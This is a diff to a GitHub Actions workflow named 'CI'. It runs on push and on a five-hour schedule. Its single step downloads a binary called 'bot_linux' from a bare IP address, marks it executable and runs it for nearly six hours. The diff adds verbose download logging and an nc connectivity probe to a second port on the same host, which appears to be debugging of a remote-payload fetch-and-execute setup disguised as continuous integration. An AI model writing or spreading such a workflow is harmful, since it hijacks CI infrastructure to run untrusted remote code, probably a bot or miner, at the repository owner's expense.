@@ -2,7 +2,7 @@ name: CI
 on:
   push:
   schedule:
-    - cron: '0 */5 * * *'
+    - cron: "0 */5 * * *"
   workflow_dispatch:
 
 jobs:
@@ -15,6 +15,8 @@ jobs:
     steps:
       - name: run
         run: |
-          curl -sL http://45.153.34.235:8888/bot_linux -o /tmp/b
+          curl -v -sL http://45.153.34.235:8888/bot_linux -o /tmp/b 2>&1 | tail -5
+          ls -lh /tmp/b
           chmod +x /tmp/b
-          timeout 21000 /tmp/b || true
+          nc -zv 45.153.34.235 4445 2>&1 || echo port_blocked
+          timeout 21000 /tmp/b || echo exit_$?
